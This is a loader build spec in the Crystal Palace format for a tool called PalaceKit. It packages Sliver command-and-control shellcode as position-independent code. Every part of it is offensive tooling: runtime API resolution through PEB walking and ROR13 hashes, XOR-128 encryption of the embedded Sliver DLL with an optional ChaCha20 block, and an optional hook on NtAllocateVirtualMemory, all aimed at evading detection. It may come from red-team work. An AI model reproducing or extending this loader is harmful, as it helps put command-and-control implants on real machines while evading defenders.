x64:
    ; PalaceKit loader spec — Crystal Kit format for Sliver.
    ;
    ; The C sources are compiled as a unity build (unity.c includes every
    ; loader source into one TU) which keeps cross-TU references local and
    ; avoids MinGW's .refptr / ADDR64 indirections — those require runtime
    ; absolute addresses incompatible with PIC shellcode.
    ;
    ; All API calls in loader.c use the Crystal Palace DFR convention
    ; (MODULE$FUNCTION). PalaceKit resolves each unresolved external at
    ; link time:
    ;   • If a `attach "MODULE$FUNC" "_local"` line is present, calls are
    ;     redirected to the local hook symbol (see hooks.c).
    ;   • Otherwise, PalaceKit emits a default PEB-resolver thunk that calls
    ;     patch_resolve(ror13_hash) at runtime and tail-jumps to the result.

    load "bin/loader.x64.o"
        make pic +gofirst +optimize

    dfr "resolve" "ror13"

    ; ── Example: attach a hook to the memory allocator. ───────────────────
    ; Uncomment to redirect every NtAllocateVirtualMemory call in the loader
    ; to _HookedNtAllocateVirtualMemory (defined in hooks.c). `preserve`
    ; exempts the hook's own forward-call so it can reach the real API.
    ;
    ; attach   "NTDLL$NtAllocateVirtualMemory" "_HookedNtAllocateVirtualMemory"
    ; preserve "NTDLL$NtAllocateVirtualMemory" "_HookedNtAllocateVirtualMemory"

    ; ── Embedded Sliver shellcode encryption. ─────────────────────────────
    ; Default is XOR-128. For ChaCha20-IETF (32-byte key + 12-byte nonce),
    ; uncomment the chacha20 block and comment out the XOR block.
    ;
    ; generate $KEY   32
    ; generate $NONCE 12
    ; push $DLL
    ;     chacha20 $KEY $NONCE
    ;     preplen
    ;     link "dll"
    ; push $KEY
    ;     preplen
    ;     link "mask"
    ; push $NONCE
    ;     preplen
    ;     link "nonce"

    generate $MASK 128

    push $DLL
        xor $MASK
        preplen
        link "dll"

    push $MASK
        preplen
        link "mask"

    run "pico.spec"
        link "pico"

    export
